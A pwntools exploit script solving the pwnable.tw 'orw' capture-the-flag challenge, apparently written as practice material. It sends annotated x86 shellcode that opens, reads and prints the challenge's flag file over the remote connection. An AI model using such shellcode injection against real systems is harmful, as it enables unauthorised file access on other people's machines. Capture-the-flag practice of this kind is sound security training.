#! /usr/bin/python

from pwn import *

'''
Read the flag from /home/orw/flag.
Only open read write syscall are allowed to use.
'''

# nc chall.pwnable.tw 10001
s = remote('chall.pwnable.tw', 10001)

#s = process('./orw')
#gdb.attach(s)

'''
0:  b8 05 00 00 00          mov    eax,0x5     ; open syscall num
5:  53                      push   ebx         ; ebx is 0 already when we call our shellcode
6:  68 66 6c 61 67          push   0x67616c66  ; /home//orw//flag = 2f686f6d652f2f6f72772f2f666c6167
b:  68 72 77 2f 2f          push   0x2f2f7772
10: 68 65 2f 2f 6f          push   0x6f2f2f65
15: 68 2f 68 6f 6d          push   0x6d6f682f
1a: 89 e3                   mov    ebx,esp     ; file path = /home//orw//flag
1c: 31 c9                   xor    ecx,ecx     ; flag = 0 (read only)
1e: 31 d2                   xor    edx,edx     ; mode (no mode)
20: cd 80                   int    0x80
'''

open_sc = '\xB8\x05\x00\x00\x00\x53\x68\x66\x6C\x61\x67\x68\x72\x77\x2F\x2F\x68\x65\x2F\x2F\x6F\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x31\xD2\xcd\x80'


'''
0:  ba 30 00 00 00          mov    edx,0x30   ; data length
5:  89 e1                   mov    ecx,esp    ; where to read into
7:  89 c3                   mov    ebx,eax    ; file descriptor 
9:  b8 03 00 00 00          mov    eax,0x3    ; read syscall num
e:  cd 80                   int    0x80
'''
read_sc = '\xBA\x30\x00\x00\x00\x89\xE1\x89\xC3\xB8\x03\x00\x00\x00\xCD\x80'


'''
0:  ba 30 00 00 00          mov    edx,0x30   ; data length
5:  89 e1                   mov    ecx,esp    ; where to write from
7:  bb 01 00 00 00          mov    ebx,0x1    ; file descriptor (stdout)
c:  b8 04 00 00 00          mov    eax,0x4    ; write syscall num
11: cd 80                   int    0x80
'''
write_sc = '\xBA\x30\x00\x00\x00\x89\xE1\xBB\x01\x00\x00\x00\xB8\x04\x00\x00\x00\xCD\x80'

payload = open_sc + read_sc + write_sc

s.sendlineafter('Give my your shellcode:', payload)

s.interactive()
